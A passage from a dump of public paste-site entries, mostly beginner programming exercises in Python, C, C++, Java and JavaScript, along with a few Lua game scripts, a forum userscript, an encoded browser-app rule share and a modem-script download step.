    with open(string,'w') as file:
        file.write(string + '\n')

#Task 11
def string_11(string):
    with open(string,'w') as file:
        file.writelines(x)

#Task 12
def string_12(x1, x2):
    with open(x1, 'r') as file1:
        with open(x2, 'a') as file2:
            for line in file1:
                print(line, file=file2)

#Task 13

def string_13(x1, x2):
    with open(x1, 'r') as file1:
        with open(x2, 'a') as file2:
            for line in file1:
                line_1 = line.strip()
                if line_1.startswith('hello') and line_1.endswith('world'):
                    file2.write(line)

#Task 14

def string_14(name):
    solve = {}
    with open(name, 'r') as file:
        data = file.readlines()[:1]
    for line in data:
        sp = line.split()
        solve[sp[0]] = (sp[1], sp[2])
    return solve
"
kCcDFDBa,Untitled,dllbridge,C,Saturday 13th of April 2024 07:25:49 AM CDT,"
#include<stdio.h>



void  Dog(int *c, int *q);




////////////////////////////////////////////////////////////
int main()
{
	
	int c = 14,
	    q = 20;   
	
    Dog(&c, &q);
    printf(""From main:\n"");
    printf(""addres c = %d \n"", &c);    
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);    
}



///////////////////////////////////////////////////////////
void  Dog(int *c, int *q)  // c - это левая рука
{                          // q - правая рука 
	
      int a;               //  Стол
    
	  a = *c;              //  Положили на стол из левой руки
     *c = *q;              //  Из правой руки кладём торт в левую руку.    
     *q = a;               //  Правой рукой берём торт со стола
    
    printf(""From Dog:\n""  );
    printf(""addres c = %d \n"", c);    
    printf(""*c = %d \n"", *c);
    printf(""*q = %d \n"", *q);      

}



/*

#include<stdio.h>



void  Dog(int &c, int &q);




////////////////////////////////////////////////////////////
int main()
{
	
	int c = 14,
	    q = 20;   
	
    Dog(c, q);
    printf(""From main:\n"");
    printf(""addres c = %d \n"", &c);    
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);    
}



///////////////////////////////////////////////////////////
void  Dog(int &c, int &q)  // c - это левая рука
{                        // q - правая рука 
	
      int a;             //  Стол
    
	  a = c;             //  Положили на стол из левой руки
      c = q;             //  Из правой руки кладём торт в левую руку.    
      q = a;             //  Правой рукой берём торт со стола
    
    printf(""From Dog:\n""  );
    printf(""addres c = %d \n"", &c);    
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);      

}

*/













/*

#include<stdio.h>



void  Dog(int c, int q);




////////////////////////////////////////////////////////////
int main()
{
	
	int c = 14,
	    q = 20;   
	
    Dog(c, q);
    printf(""From main:\n"");
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);    
}



///////////////////////////////////////////////////////////
void  Dog(int c, int q)  // c - это левая рука
{                        // q - правая рука 
	
      int a;             //  Стол
    
	  a = c;             //  Положили на стол из левой руки
      c = q;             //  Из правой руки кладём торт в левую руку.    
      q = a;             //  Правой рукой берём торт со стола
    
    printf(""From Dog:\n""  );
    printf("" c = %d \n"", c);
    printf("" q = %d \n"", q);      

}



*/


"
tTWVNgQ1,Untitled,35657,C++,Saturday 13th of April 2024 06:28:36 AM CDT,"
#include <iostream>

using namespace std;

void reverse(int number) {
    if (number < 10) {
        cout << number;
    }
    else {
        cout << number % 10; 
        reverse(number / 10); 
    }
}


int main() {
    setlocale(LC_ALL, ""ru"");

    reverse(7563);

}"
1jQ5GQ4Z,data895,TestGuy1,JSON,Saturday 13th of April 2024 06:00:06 AM CDT,"{
  status: 'Success',
  method: 'server',
  maindata: '31d170a67989e23e1449237783ebab3a83538db566211684bd1cf420278b11795ef3626b1166faecb31421c77c3beae8a3ffa116be63343f22aab1707336fcfc06e808c81859f10986fc2234255bf1d7522d23a2f1c0ea498d87f0ae114592ff77942eb6a90ef6575067dd7fd2e2a7c603d394aee6b1ad2e0e923a2c96822c13',
  otherdata: [
    'bb18558019fcaf8e4adfe6f0e1db784d',
    'd543db2a6496ccd8e1a6b4b2390b301a',
    '9b492a3bdc376cff963e4f3530f0115a',
    '98e458467c56af8b21bffbd3ee22cf9d',
    '40af9eefc069e55d188cf50853086531',
    '8867ea306bb72c49e2f0b0812612431e',
    '062b7bb9ca27a26806e3df0911140897',
    '2d81bfa8d5e2805d53666892f7fc5ef2'
  ]
}"
jPzBnkPE,Untitled,35657,C++,Saturday 13th of April 2024 05:55:40 AM CDT,"
#include <iostream>

using namespace std;

void tower(int n, char src, char dest, char temp) {
    if (n == 0) {
        return;
    }
    tower(n - 1, src, temp, dest);
    cout << n << "" "" << src << "" -> "" << dest << endl;
    tower(n - 1, temp, dest, src);
}


int main() {
    setlocale(LC_ALL, ""ru"");

    tower(3, 'A', 'C', 'B');

}"
kenKH2wj,06. Building,myrdok123,Java,Saturday 13th of April 2024 05:17:37 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P06Building {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

             int floors = Integer.parseInt(scanner.nextLine());
             int rooms = Integer.parseInt(scanner.nextLine());

        for (int i = floors; i >= 1 ; i--) {

            for (int j = 0; j < rooms; j++) {

                if (i == floors){
                    System.out.printf(""L%d%d "", i, j);
                } else if (i % 2 == 0) {
                    System.out.printf(""O%d%d "", i, j);
                }else {
                    System.out.printf(""A%d%d "", i, j);
                }

            }

            System.out.println();

        }
    }
}
"
J3P2T0j4,05. Travelling,myrdok123,Java,Saturday 13th of April 2024 05:16:42 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P05Travelling {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        String destination = scanner.nextLine();

        while (!destination.equals(""End"")){
            double neededMoney = Double.parseDouble(scanner.nextLine());

            double savedMoney = 0;
            while (neededMoney > savedMoney){
                double currentMoney = Double.parseDouble(scanner.nextLine());
                savedMoney += currentMoney;
            }

            System.out.printf(""Going to %s!%n"", destination);

            destination = scanner.nextLine();
        }


    }
}
"
HTpunDQN,04. Sum of Two Numbers,myrdok123,Java,Saturday 13th of April 2024 05:16:16 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P04SumOfTwoNumbers {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        int firstNumber = Integer.parseInt(scanner.nextLine());
        int secondNumber = Integer.parseInt(scanner.nextLine());
        int magicNumber = Integer.parseInt(scanner.nextLine());

        int countCombination = 0;
        boolean flag = false;

        for (int first = firstNumber; first <= secondNumber ; first++) {

            for (int second = firstNumber; second <= secondNumber ; second++) {
                countCombination++;
                int currentCombination = first + second;

                if (currentCombination == magicNumber){
                    System.out.printf(""Combination N:%d (%d + %d = %d)"", countCombination, first, second, magicNumber);
                    flag = true;
                    break;
                }

            }

            if(flag){
                break;
            }

        }
        if(!flag){
            System.out.printf(""%d combinations - neither equals %d"", countCombination, magicNumber);
        }
    }
}
"
cqcygGqU,03. Combinations,myrdok123,Java,Saturday 13th of April 2024 05:15:44 AM CDT,"package NestedLoops;

import java.util.Scanner;

public class P03Combinations {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);

        int number = Integer.parseInt(scanner.nextLine());

        int countCombinations = 0;

        for (int x1 = 0; x1 <= number; x1++) {

            for (int x2 = 0; x2 <= number; x2++) {

                for (int x3 = 0; x3 <= number; x3++) {

                    int currentCombination = x1 + x2 + x3;

                    if (currentCombination == number){

                        countCombinations++;

                    }

                }
            }

        }

        System.out.println(countCombinations);


    }
}
"
pHTmh1fA,02. Multiplication Table,myrdok123,Java,Saturday 13th of April 2024 05:14:58 AM CDT,"package NestedLoops;

public class P02MultiplicationTable {

    public static void main(String[] args) {


        for (int firstMultiplier = 1; firstMultiplier <= 10; firstMultiplier++) {

            for (int secondMultiplier = 1; secondMultiplier <= 10 ; secondMultiplier++) {

                System.out.printf(""%d * %d = %d%n"", firstMultiplier, secondMultiplier, firstMultiplier * secondMultiplier );

            }

        }

    }
}
"
Wdg7d8gD,01. Clock,myrdok123,Java,Saturday 13th of April 2024 05:14:32 AM CDT,"package NestedLoops;


public class P01Clock {

    public static void main(String[] args) {

        for (int hours = 0; hours <= 23; hours++) {

            for (int minutes = 0; minutes <= 59; minutes++) {

                System.out.printf(""%d:%d%n"", hours, minutes);

            }

        }

    }
}
"
hbiJCZee,3.LoadMeals,Silviya7,JavaScript,Saturday 13th of April 2024 05:09:51 AM CDT,"const baseURL='http://localhost:3030/jsonstore/tasks/';

const BtnLoadMeals= document.getElementById('load-meals');
const BtnAddMeal=document.getElementById('add-meal');
const ElementList= document.getElementById('list');

const Elementfood= document.getElementById('food');
const Elementtime= document.getElementById('time');
const Elementcalories= document.getElementById('calories');


const LoadMelas=
BtnLoadMeals.addEventListener('click',async ()=>{
    //Fetch all meals
    const response=await fetch(baseURL);
    const data= await response.json();
    console.log(Object.values(data));
    
    ElementList.innerHTML='';

    for (const meal of Object.values(data)) {        
        const mealBtndiv= document.createElement('div');
        mealBtndiv.id='meal-buttons';

        const BtnChange=document.createElement('button');
        BtnChange.classList.add('change-meal');
        BtnChange.textContent='Change';

        const BtnDelete=document.createElement('button');
        BtnDelete.classList.add('delete-meal');
        BtnDelete.textContent='Delete';

        mealBtndiv.appendChild(BtnChange);
        mealBtndiv.appendChild(BtnDelete);

        const Elementh1=document.createElement('h2');
        Elementh1.textContent= meal.food;
        const Elementhtime3=document.createElement('h3');
        Elementhtime3.textContent= meal.time;
        const Elementhcalories3=document.createElement('h3')
        Elementhcalories3.textContent= meal.calories;

        const divMeal= document.createElement('div');
        divMeal.classList.add('meal');
        divMeal.appendChild(Elementh1);
        divMeal.appendChild(Elementhtime3);
        divMeal.appendChild(Elementhcalories3);
        divMeal.appendChild(mealBtndiv);

        ElementList.appendChild(divMeal);

    }

});
"
VwtFhaw4,Modeminfo support Dell modem,manssizz,Bash,Saturday 13th of April 2024 05:00:21 AM CDT,"# Masuk ke direktori script modeminfo
cd /usr/share/modeminfo/scripts

# Download module untuk modem Dell DW5821e
wget https://raw.githubusercontent.com/koshev-msk/modemfeed/master/packages/net/modeminfo/root/usr/share/modeminfo/scripts/DELL.at
wget https://raw.githubusercontent.com/koshev-msk/modemfeed/master/packages/net/modeminfo/root/usr/share/modeminfo/scripts/DELL

# Masuk konfigurasi modeminfo di luci lalu klik configuration atau setup
# Pilih usb atau dataport ke /dev/ttyUSB0 atau /dev/ttyUSB1 (sesuaikan sampai muncul)
# Klik save & apply
# Masuk lagi ke modeminfo luci, ke details
# Tunggu aja, nanti juga muncul 
"
G6uwakwH,Untitled,35657,C++,Saturday 13th of April 2024 04:43:04 AM CDT,"
#include <iostream>

using namespace std;

int binary_search(int* arr, int x, int left, int right) {

    if (left >= right) {
        return -1;
    }

    int mid = (left + right) / 2;

    if (arr[mid] == x) {
        return mid;
    }
    else if (arr[mid] > x) {
        return binary_search(arr, x, left, mid);
    }
    else {
        return binary_search(arr, x, mid + 1, right);
    }
}


// функция линейного поиска для сравнения
int search(int* arr, int size, int x) {
    for (int i = 0; i < size; i++) {
        if (arr[i] == x) {
            return i;
        }
    }
    return -1;
}

int main() {
    setlocale(LC_ALL, ""ru"");

    const int size = 200000;

    int arr[size];

    for (int i = 0; i < size; i++) {
        arr[i] = i;
    }

    int index, x = 153879;

    int start_time = clock();

    for (int i = 0; i < 100000; i++) {
        index = binary_search(arr, x, 0, size);
    }

    int end_time = clock();

    cout << ""index "" << index << "", time "" << end_time - start_time << "" milliseconds"" << endl;

    start_time = clock();

    for (int i = 0; i < 100000; i++) {
        index = search(arr, size, x);
    }
    
    end_time = clock();

    cout << ""index "" << index << "", time "" << end_time - start_time << "" milliseconds"" << endl;

}"
kj9ZuQPa,Sessions list,ur9rgi,Lua,Saturday 13th of April 2024 04:16:04 AM CDT,"local function addSession(host, time, user)
	local frame = script.Parent.SurfaceGui.Trainings.ScrollingFrame
	local Template = script.Parent.SurfaceGui.Trainings.Template
	local clonedTemplate = Template:Clone()

	-- Set session information
	clonedTemplate.Parent = frame
	clonedTemplate.Visible = true
	clonedTemplate.Info.Host.Text = host
	clonedTemplate.Info.Time.Text = time
    local charector = user
    local Players = game:GetService(""Players"")
    local imagelabel = clonedTemplate.Host
    imagelabel.Image = Players:GetUserThumbnailAsync(charector,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
end

local function concludeSession(host, time, user)
	local frame = script.Parent.SurfaceGui.ConcludedTrainings.ScrollingFrame
	local Template = script.Parent.SurfaceGui.ConcludedTrainings.Template
	local clonedTemplate = Template:Clone()

	-- Set session information
	clonedTemplate.Parent = frame
	clonedTemplate.Visible = true
	clonedTemplate.Info.Host.Text = host
	clonedTemplate.Info.Time.Text = time
    local charector = user
    local Players = game:GetService(""Players"")
    local imagelabel = clonedTemplate.Host
    imagelabel.Image = Players:GetUserThumbnailAsync(charector,Enum.ThumbnailType.HeadShot,Enum.ThumbnailSize.Size420x420)
end
-- IGNORE ABOVE, SCRIPTING
addSession(""Evilcabbage999"", ""4:00PM - GMT"", 954833588)
concludeSession(""Evilcabbage999"", ""4:00PM - GMT"", 954833588)

-- Guide: Place your username (this will be displayed as the host), then select time, this time is for today. After you can get a userid you want to be the picture. Check the URL at the top of the screen and copy the number. Delete your addsession after it concluded."
Mr3FuF8D,GPS,TurtleBull,Lua,Saturday 13th of April 2024 03:48:13 AM CDT,"--Central GPS Config
ComputerLabel = os.getComputerLabel()
PasteBinCode = ""Mr3FuF8D""
if     ComputerLabel == 'TB_GPS_1' then loc={x=1726,z=105,y=1255}
elseif ComputerLabel == 'TB_GPS_2' then loc={x=1745,z=105,y=1255}
elseif ComputerLabel == 'TB_GPS_3' then loc={x=1745,z=117,y=1249}
elseif ComputerLabel == 'TB_GPS_4' then loc={x=1745,z=117,y=1255}
else
	loc={x=0,y=0,z=0}
end

if loc.x~=0 and loc.y~=0 and loc.z~=0 then 
	term.clear()
	term.setCursorPos(1,1); term.write(""Pastebin GPS - "" ..PasteBinCode)
	term.setCursorPos(1,2); term.write(""========================"")
	term.setCursorPos(1,3); term.write(""Name:     ""..ComputerLabel)
	term.setCursorPos(1,4); term.write(""Location: ""..loc.x.."",""..loc.z.."",""..loc.y)
	term.setCursorPos(1,6);
	shell.run(""gps"",""host"",loc.x,loc.z,loc.y)
else
	term.setCursorPos(1,1); term.write(""Pastebin GPS - "" ..PasteBinCode)
	term.setCursorPos(1,2); term.write(""========================"")
	term.setCursorPos(1,3); term.write(""Name:     ""..ComputerLabel)
	term.setCursorPos(1,4); term.write(""ERROR; UNKNOWN TERMINAL NAME"")
	term.setCursorPos(1,6)
end


	
	
"
SCspHDMz,邀您一起看：新的,xiaomianao666,JavaScript,Saturday 13th of April 2024 02:43:14 AM CDT,海阔视界规则分享，当前分享的是：二级页面详情￥page_detail￥新的@@eyJkYXRhIjoie1wiYXNzb2NpYXRlZE1vZGVsc01hcEZvckpvaW5UYWJsZVwiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhGS1wiOnt9LFwiYXNzb2NpYXRlZE1vZGVsc01hcFdpdGhvdXRGS1wiOnt9LFwiZmllbGRzVG9TZXRUb0RlZmF1bHRcIjpbXSxcImdtdE1vZGlmaWVkXCI6MCxcImlkXCI6MCxcImxpc3RUb0NsZWFyQXNzb2NpYXRlZEZLXCI6W10sXCJsaXN0VG9DbGVhclNlbGZGS1wiOltdLFwicGFnZUxpc3RcIjpbXSxcInNhdmVkXCI6ZmFsc2UsXCJ0aXRsZVwiOlwi5paw55qEXCIsXCJ2ZXJzaW9uXCI6MCxcInVybFwiOlwiaGlrZXI6Ly9lbXB0eVwiLFwiY29sX3R5cGVcIjpcInRleHRfM1wiLFwiZmluZF9ydWxlXCI6XCJqczogXFxudmFyIGQgPSBbXTtcXG52YXIgcnVsZSA9IEpTT04ucGFyc2UoZmV0Y2goZ2V0VmFyKFxcXCJydWxlc0ltcG9ydFVybFxcXCIpKSk7XFxuaWYgKHJ1bGUgIT0gbnVsbCAmJiBydWxlLmxlbmd0aCA+IDApIHtcXG4gaWYgKHJ1bGVbMF0uZmluZF9ydWxlICE9IG51bGwpIHtcXG4gdmFyIHBhc3NXb3JkMSA9ICc1clczNlppVTZLZUc1NVdNNzd5TTZhYVc2YUcxNmFLUjZZR1Q1WkNJNlp1Rzc3K2xhRzl0WlY5eWRXeGxYM1Z5Yk8rL3BRPT0nLFxcbiBwYXNzV29yZDIgPSAnNXJXMzZaaVU2S2VHNTVXTTZLZUU1WWlaNVlpRzVMcXI3N3lNNWIyVDVZbU41WWlHNUxxcjU1cUU1cGl2Nzd5YTZhYVc2YUcxNmFLUjZZR1Q3NytsYUc5dFpWOXlkV3hsNzcrbCc7XFxuIH0gZWxzZSB7XFxuIHZhciBwYXNzV29yZDEgPSAnNXJXMzZaaVU2S2VHNTVXTTc3eU01TG1tNTYyKzZLZUU1WWlaNzcrbFltOXZhMjFoY210ZmRYSnM3NytsJyxcXG4gcGFzc1dvcmQyID0gJzVyVzM2WmlVNktlRzU1V003N3lNNUxtbTU2Mis2S2VFNVlpWjc3K2xZbTl2YTIxaGNtdnZ2NlU9JztcXG4gfVxcbn1cXG50cnkge1xcbiB2YXIgZ3JvdXBzPXt9O1xcbiBmb3IgKHZhciBpID0gMDsgaSA8IHJ1bGUubGVuZ3RoOyBpKyspIHtcXG4gdmFyIGdyb3VwID0gcnVsZVtpXVsnZ3JvdXAnXTtcXG4gaWYoZ3JvdXA9PW51bGwgfHwgZ3JvdXA9PVxcXCJcXFwiKXtcXG4gICAgIGdyb3VwPVxcXCLml6DliIbnu4Tkv6Hmga9cXFwiO1xcbiB9XFxuIGlmKGdyb3Vwc1tncm91cF09PW51bGwpe1xcbiAgICAgZ3JvdXBzW2dyb3VwXT1bXVxcbiB9XFxuIGdyb3Vwc1tncm91cF0ucHVzaChydWxlW2ldKTtcXG4gfVxcbiB2YXIgcmVzdWx0PU9iamVjdC5rZXlzKGdyb3VwcykubWFwKGtleT0+Z3JvdXBzW2tleV0pO1xcbiAvL3NldEVycm9yKEBMb3lEZ0lrKTtcXG4gZm9yICh2YXIgaSBpbiByZXN1bHQpIHtcXG4gICAgIHB1dFZhcigncnVsZXNJbXBvcnRHcm91cCcraSxKU09OLnN0cmluZ2lmeShyZXN1bHRbaV0pKTtcXG4gZC5wdXNoKHtcXG4gdGl0bGU6ICfigJjigJjigJnigJk8c3Ryb25nPjxmb250IGNvbG9yPVxcXCIjMzU4Y2NkXFxcIj4nK3Jlc3VsdFtpXVswXS5ncm91cCArICfvvIjngrnlh7vlr7zlhaXor6XliIbnu4TvvIk8L2Zyb250Pjwvc3Ryb25nPicsXFxuIHVybDogJChcXFwiXFxcIikubGF6eVJ1bGUoKFtpLHBhc3NXb3JkMV0pPT57XFxuICAgICBjb25zdCBmaWxlPSdoaWtlcjovL2ZpbGVzL3RtcC9pbXBvcnQuanNvbic7XFxuICAgICB3cml0ZUZpbGUoZmlsZSxnZXRWYXIoJ3J1bGVzSW1wb3J0R3JvdXAnK2kpKTtcXG4gICAgIHJldHVybiAncnVsZTovLycgKyBiYXNlNjRFbmNvZGUoYmFzZTY0RGVjb2RlKHBhc3NXb3JkMSkgKyBmaWxlKS5yZXBsYWNlKC9cXFxcbi9nLCAnJylcXG4gfSxbaSxwYXNzV29yZDFdKSxcXG4gY29sX3R5cGU6ICd0ZXh0X2NlbnRlcl8xJ1xcbiB9KTtcXG4gZm9yICh2YXIgaWkgPSAwOyBpaSA8IHJlc3VsdFtpXS5sZW5ndGg7IGlpKyspIHtcXG4gdmFyIHIgPSB7fTtcXG4gdmFyIGogPSByZXN1bHRbaV1baWldO1xcbiByLnRpdGxlID0gai50aXRsZTtcXG4gaWYgKHJ1bGVbMF0uZmluZF9ydWxlICE9IG51bGwpIHtcXG4gci51cmwgPSAncnVsZTovLycgKyBiYXNlNjRFbmNvZGUoYmFzZTY0RGVjb2RlKHBhc3NXb3JkMikgKyBKU09OLnN0cmluZ2lmeShqKSkucmVwbGFjZSgvXFxcXG4vZywgJycpO1xcbiB9IGVsc2Uge1xcbiByLnVybCA9ICdydWxlOi8vJyArIGJhc2U2NEVuY29kZShiYXNlNjREZWNvZGUocGFzc1dvcmQyKSArIGoudGl0bGUgKyBiYXNlNjREZWNvZGUoJzc3K2wnKSArIGoudXJsICsgYmFzZTY0RGVjb2RlKCc3NytsJykgKyBqLmdyb3VwKS5yZXBsYWNlKC9cXFxcbi9nLCAnJyk7XFxuIH1cXG4gZC5wdXNoKHIpO1xcbiB9XFxuIH1cXG59IGNhdGNoKGUpIHtcXG4gZC5wdXNoKHtcXG4gdGl0bGU6ICfliqDovb3plJnor68nLFxcbiB1cmw6ICdoaWtlcjovL2hvbWUnLFxcbiBkZXNjOiAn6ZSZ6K+v5L+h5oGv77yaJytlLFxcbiBjb2xfdHlwZTogJ3RleHRfY2VudGVyXzEnXFxuIH0pO1xcbn1cXG5wdXRWYXIoe1xcbiBrZXk6ICd1cmwnLFxcbiB2YWx1ZTogZ2V0VXJsKClcXG59KTtcXG5zZXRSZXN1bHQoZCk7XCIsXCJncm91cFwiOlwiXCJ9IiwidGl0bGUiOiLmlrDnmoQifQ==
GDkAcMJc,Untitled,35657,C++,Saturday 13th of April 2024 02:42:33 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru"");

    char line[40];
    gets_s(line);
    int num = strlen(line) + 1;
    cout << ""Занято "" << num << "", свободно "" << 40 - num << endl;
}"
xFfV5HXV,BBS ReCaptcha Fix (Script Breaking),Degritone,JavaScript,Saturday 13th of April 2024 02:34:17 AM CDT,"// ==UserScript==
// @name         BBS Captcha Fix iFrame
// @version      1.0
// @description  Fix the BBS's Recaptcha with an iframe, which breaks most other scripts
// @author       Degritone
// @match        *://dollars-bbs.org/*
// @grant        none
// @run-at       document-end
// ==/UserScript==


function replaceHTML(){
  let html = document.getElementsByTagName(""html"")[0].outerHTML
    .replace(`var self=`,`var nameWithoutCollision = `)
    .replace(`<script type=""text/javascript"" src=""/random/kareha.js""></script>`,karehaUpdated)
    .replace(`<body class=""mainpage"">`,"""")
    .replace(`</head>`,"""")
    .replace(""<head>"",`<body class=""mainpage"">`)

  let iframe = document.createElement(""iframe"");
  iframe.style.cssText = `
    position:fixed;
    left:0px;
    right:0px;
    top:0px;
    bottom:0px;
    border:0px;
    width:100%;
    height:100%;
  `;

  document.body.innerHTML = """";
  document.body.appendChild(iframe);

  iframe.contentWindow.document.open();
  iframe.contentWindow.document.write(""<!doctype html>""+html);
  iframe.contentWindow.document.close();
}

let karehaUpdated = `<script>function require_script_version(v)
{
	if(v!=""3.a"") alert("""");
}



function show(id)
{
	var style=document.getElementById(id).style;
	if(style.display) style.display="""";
	else style.display=""none"";
}

function insert(text,thread)
{
	var textarea=document.getElementById(""postform""+thread).comment;
	if(textarea)
	{
		if(textarea.createTextRange && textarea.caretPos) // IE
		{
			var caretPos=textarea.caretPos;
			caretPos.text=caretPos.text.charAt(caretPos.text.length-1)=="" ""?text+"" "":text;
		}
		else if(textarea.setSelectionRange) // Firefox
		{
			var start=textarea.selectionStart;
			var end=textarea.selectionEnd;
			textarea.value=textarea.value.substr(0,start)+text+textarea.value.substr(end);
			textarea.setSelectionRange(start+text.length,start+text.length);
		}
		else
		{
			textarea.value+=text+"" "";
		}
		textarea.focus();
	}
}

function w_insert(text,link)
{
	if(document.body.className==""mainpage"") document.location=link+""#i""+text;
	else insert(text,"""");
}

function size_field(id,rows) { document.getElementById(id).comment.setAttribute(""rows"",rows); }

function submit_form(btn)
{
	btn.disabled = true;
	btn.value = ""Please wait..."";
	btn.form.submit();
}

function delete_post(thread,post,file)
{
	if(confirm(""Are you sure you want to delete reply ""+post+""?""))
	{
		var fileonly=false;
		var script=document.forms[0].action;
		var password=document.forms[0].password.value;

		if(file) fileonly=confirm(""Leave the reply text and delete the only file?"");

		document.location=script
		+""?task=delete""
		+""&delete=""+thread+"",""+post
		+""&password=""+password
		+""&fileonly=""+(fileonly?""1"":""0"");
	}
}

function preview_post(formid,thread)
{
	var form=document.getElementById(formid);
	var preview=document.getElementById(""preview""+thread);

	if(!form||!preview) return;

	preview.style.display="""";
	preview.innerHTML=""<em>Loading...</em>"";

	var text;
	text=""task=preview"";
	text+=""&comment=""+encodeURIComponent(form.comment.value);
	text+=""&markup=""+encodeURIComponent(form.markup.value);
	if(thread) text+=""&thread=""+thread;

	var xmlhttp=get_xmlhttp();
	xmlhttp.open(""POST"",nameWithoutCollision);
	xmlhttp.onreadystatechange=function() {
		if(xmlhttp.readyState==4) preview.innerHTML=xmlhttp.responseText;
	}
	if(is_ie()||xmlhttp.setRequestHeader) xmlhttp.setRequestHeader(""Content-Type"",""application/x-www-form-urlencoded"");
	xmlhttp.send(text);
}

function get_xmlhttp()
{
	var xmlhttp;
	try { xmlhttp=new ActiveXObject(""Msxml2.XMLHTTP""); }
	catch(e1)
	{
		try { xmlhttp=new ActiveXObject(""Microsoft.XMLHTTP""); }
		catch(e1) { xmlhttp=null; }
	}

	if(!xmlhttp && typeof XMLHttpRequest!='undefined') xmlhttp=new XMLHttpRequest();

	return(xmlhttp);
}

function is_ie()
{
	return(document.all&&!document.opera);
}



function set_new_inputs(id)
{
	var el=document.getElementById(id);

	if(!el||!el.link) return;

	if(!el.field_a.value) el.field_a.value=get_cookie(""name"");
	if(!el.password.value) el.password.value=get_password(""password"");
	if(el.markup&&!el.comment.value) el.markup.value=get_cookie(""markup"");
	select_markup(el.markup);
}

function set_delpass(id)
{
	with(document.getElementById(id)) password.value=get_cookie(""password"");
}

function make_password()
{
	var chars=""abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"";
	var pass='';

	for(var i=0;i<8;i++)
	{
		var rnd=Math.floor(Math.random()*chars.length);
		pass+=chars.substring(rnd,rnd+1);
	}

	return(pass);
}

function get_password(name)
{
	var pass=get_cookie(name);
	if(pass) return pass;
	return make_password();
}

function select_markup(sel)
{
	if(!window.markup_descriptions) return;

	var el=sel;
	while(el=el.nextSibling) if(el.nodeName.toLowerCase()==""small"") break;

	if(el) el.innerHTML=markup_descriptions[sel.value];
}



function get_cookie(name)
{
	with(document.cookie)
	{
		var regexp=new RegExp(""(^|;\\s+)""+name+""=(.*?)(;|$)"");
		var hit=regexp.exec(document.cookie);
		if(hit&&hit.length>2) return unescape(hit[2]);
		else return '';
	}
};

function set_cookie(name,value,days)
{
	if(days)
	{
		var date=new Date();
		date.setTime(date.getTime()+(days*24*60*60*1000));
		var expires=""; expires=""+date.toGMTString();
	}
	else expires="""";
	document.cookie=name+""=""+value+expires+""; path=/"";
}

function set_stylesheet(styletitle)
{
	var links=document.getElementsByTagName(""link"");
	var found=false;
	for(var i=0;i<links.length;i++)
	{
		var rel=links[i].getAttribute(""rel"");
		var title=links[i].getAttribute(""title"");
		if(rel.indexOf(""style"")!=-1&&title)
		{
			links[i].disabled=true; // IE needs this to work. IE needs to die.
			if(styletitle==title) { links[i].disabled=false; found=true; }
		}
	}
	if(!found) set_preferred_stylesheet();
}

function set_preferred_stylesheet()
{
	var links=document.getElementsByTagName(""link"");
	for(var i=0;i<links.length;i++)
	{
		var rel=links[i].getAttribute(""rel"");
		var title=links[i].getAttribute(""title"");
		if(rel.indexOf(""style"")!=-1&&title) links[i].disabled=(rel.indexOf(""alt"")!=-1);
	}
}

function get_active_stylesheet()
{
	var links=document.getElementsByTagName(""link"");
	for(var i=0;i<links.length;i++)
	{
		var rel=links[i].getAttribute(""rel"");
		var title=links[i].getAttribute(""title"");
		if(rel.indexOf(""style"")!=-1&&title&&!links[i].disabled) return title;
	}
}

function get_preferred_stylesheet()
{
	var links=document.getElementsByTagName(""link"");
	for(var i=0;i<links.length;i++)
	{
		var rel=links[i].getAttribute(""rel"");
		var title=links[i].getAttribute(""title"");
		if(rel.indexOf(""style"")!=-1&&rel.indexOf(""alt"")==-1&&title) return title;
	}
	return null;
}



window.onunload=function(e)
{
	if(style_cookie)
	{
		var title=get_active_stylesheet();
		set_cookie(style_cookie,title,365);
	}
}

window.onload=function(e)
{
	var inputs = document.getElementsByTagName(""input"");
  for (var i = 0; i < inputs.length; i++) {
    if (inputs[i].type.toLowerCase() === ""submit"") {
      inputs[i].disabled = false;
    }
  }
	if(match=/#i(.+)/.exec(document.location.toString()))
	if(!document.getElementById(""postform"").comment.value)
	insert(unescape(match[1]),"""");
}

if(style_cookie)
{
	var cookie=get_cookie(style_cookie);
	var title=cookie?cookie:get_preferred_stylesheet();
	set_stylesheet(title);
}

var captcha_key=make_password();</script>`

replaceHTML();"
fZnziAP0,Untitled,35657,C++,Saturday 13th of April 2024 02:28:06 AM CDT,"#define _CRT_SECURE_NO_WARNINGS

#include <iostream>

using namespace std;

int main() {
    setlocale(LC_ALL, ""ru"");

    srand(time(NULL));

    char line[40] = ""My line"";

    //cin >> line; // считывает символы до первого пробела

    //gets_s(line); // считывает вместе с пробелами (до перевода строки по Enter)

    //cout << line;

    cout << ""Длина строки: "" << strlen(line) << endl; // определяет длину строки (количество символов)

    char line2[40];

    strcpy(line2, line);

    /*for (int i = 0; i <= strlen(line); i++) {
        line2[i] = line[i];
    }*/

    cout << line2 << endl;

    cout << strcmp(line, line2) << endl; // сравнивает две строки лексикографически, возвращает 0 если они равны, -1 если левая меньше правой, 1 если левая больше правой

    strcat(line2, "" - line2""); // дописывает указанное содержимое в конец строки line2

    cout << line2 << endl;

    cout << strchr(line2, '-') << endl; // находит позицию данного символа и возвращает указатель на него (либо 0 если не нашел)

    cout << strstr(line2, ""ine"") << endl; // ищет подстроку в указанной строке, возвращает указатель на неё или 0
}"
0r1KRW6V,gazebo,jkw010,JSON,Saturday 13th of April 2024 01:47:27 AM CDT,"{
  ""name"": ""gazebo"",
